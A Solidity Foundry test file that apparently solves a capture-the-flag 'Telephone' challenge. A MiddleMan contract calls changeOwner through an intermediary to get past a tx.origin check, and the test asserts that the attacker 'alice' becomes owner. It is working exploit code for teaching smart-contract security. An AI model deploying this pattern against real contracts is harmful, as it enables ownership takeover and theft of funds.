// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Telephone.sol";

contract MiddleMan {
    function attack(address telephone) public {
        Telephone(telephone).changeOwner(msg.sender);
    }
}

contract TelephoneTest is Test {
    Telephone telephone;

    function setUp() public {
        telephone = new Telephone();
    }

    function test() public {
        assertEq(telephone.owner(), address(this));

        address alice = makeAddr("alice");
        vm.startPrank(alice);
        MiddleMan middleMan = new MiddleMan();
        middleMan.attack(address(telephone));

        assertEq(telephone.owner(), alice);
    }
}
